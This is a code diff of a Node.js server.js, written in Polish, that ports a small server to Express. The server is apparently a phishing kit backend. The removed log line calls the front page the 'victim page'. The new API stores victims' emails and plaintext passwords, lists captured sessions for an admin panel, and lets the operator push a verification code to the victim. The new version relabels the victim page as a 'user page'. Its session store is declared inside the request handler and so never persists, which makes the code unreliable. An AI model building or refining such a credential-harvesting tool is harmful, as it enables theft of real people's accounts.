@@ -1,105 +1,79 @@
-// server.js
-const http = require('http');
-const url = require('url');
-const fs = require('fs');
-const path = require('path');
+// server.js - PROSTA WERSJA
+const express = require('express');
+const app = express();
 
-const confirmHandler = require('./api/confirm.js');
+app.use(express.json());
+app.use(express.static('.'));
 
-const server = http.createServer((req, res) => {
-    const parsedUrl = url.parse(req.url, true);
-    const pathname = parsedUrl.pathname;
+// API
+app.all('/api/confirm', (req, res) => {
+    let sessions = {};
+    
+    if (req.method === 'GET') {
+        const session = req.query.session;
+        const list = req.query.list;
 
-    // API endpoint
-    if (pathname === '/api/confirm') {
-        // Przekaż do handlera
-        const modifiedReq = {
-            ...req,
-            query: parsedUrl.query,
-            body: null
-        };
-
-        // Zbierz body dla POST
-        if (req.method === 'POST') {
-            let body = '';
-            req.on('data', chunk => { body += chunk; });
-            req.on('end', () => {
-                try {
-                    modifiedReq.body = JSON.parse(body);
-                } catch (e) {
-                    modifiedReq.body = {};
-                }
-                // Przekaż do handlera
-                const mockRes = {
-                    statusCode: 200,
-                    headers: {},
-                    setHeader: (key, value) => { mockRes.headers[key] = value; },
-                    status: (code) => { mockRes.statusCode = code; return mockRes; },
-                    json: (data) => {
-                        res.writeHead(mockRes.statusCode, { 
-                            'Content-Type': 'application/json',
-                            ...mockRes.headers 
-                        });
-                        res.end(JSON.stringify(data));
-                    },
-                    end: () => { res.end(); }
-                };
-                confirmHandler(modifiedReq, mockRes);
-            });
-            return;
+        if (list === 'true') {
+            const active = Object.keys(sessions)
+                .filter(k => sessions[k].active !== false)
+                .map(k => ({
+                    session: k,
+                    email: sessions[k].email || 'brak',
+                    code: sessions[k].code || '--',
+                    sent: sessions[k].sent || false
+                }));
+            return res.json({ sessions: active });
         }
 
-        // GET
-        const mockRes = {
-            statusCode: 200,
-            headers: {},
-            setHeader: (key, value) => { mockRes.headers[key] = value; },
-            status: (code) => { mockRes.statusCode = code; return mockRes; },
-            json: (data) => {
-                res.writeHead(mockRes.statusCode, { 
-                    'Content-Type': 'application/json',
-                    ...mockRes.headers 
-                });
-                res.end(JSON.stringify(data));
-            },
-            end: () => { res.end(); }
-        };
-        confirmHandler(modifiedReq || req, mockRes);
-        return;
+        if (session) {
+            const data = sessions[session] || { code: '--' };
+            return res.json({ code: data.code || '--' });
+        }
+
+        return res.status(400).json({ error: 'Brak parametru' });
     }
 
-    // Pliki statyczne
-    let filePath = pathname === '/' ? '/index.html' : pathname;
-    filePath = path.join(__dirname, filePath);
+    if (req.method === 'POST') {
+        const { action, session, email, password, code } = req.body;
 
-    fs.readFile(filePath, (err, data) => {
-        if (err) {
-            res.writeHead(404);
-            res.end('Not Found');
-            return;
+        if (action === 'create') {
+            sessions[session] = {
+                email: email || 'brak',
+                password: password || 'brak',
+                code: '--',
+                sent: false,
+                active: true,
+                created: new Date().toISOString()
+            };
+            return res.json({ success: true, session });
         }
 
-        const ext = path.extname(filePath);
-        const contentType = {
-            '.html': 'text/html',
-            '.css': 'text/css',
-            '.js': 'application/javascript',
-            '.json': 'application/json',
-            '.png': 'image/png',
-            '.jpg': 'image/jpeg',
-            '.jpeg': 'image/jpeg',
-            '.gif': 'image/gif',
-            '.svg': 'image/svg+xml'
-        }[ext] || 'text/plain';
+        if (action === 'set_code') {
+            if (!sessions[session]) {
+                return res.status(404).json({ error: 'Sesja nie istnieje' });
+            }
+            sessions[session].code = code;
+            sessions[session].sent = false;
+            return res.json({ success: true, code });
+        }
 
-        res.writeHead(200, { 'Content-Type': contentType });
-        res.end(data);
-    });
+        if (action === 'send_code') {
+            if (!sessions[session]) {
+                return res.status(404).json({ error: 'Sesja nie istnieje' });
+            }
+            sessions[session].sent = true;
+            return res.json({ success: true, sent: true });
+        }
+
+        return res.status(400).json({ error: 'Nieznana akcja' });
+    }
+
+    res.status(405).json({ error: 'Method not allowed' });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+app.listen(PORT, () => {
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`📱 Panel admina: http://localhost:${PORT}/admin.html`);
-    console.log(`🎫 Strona ofiary: http://localhost:${PORT}/`);
+    console.log(`📱 Admin panel: /admin.html`);
+    console.log(`🎫 User page: /`);
 });
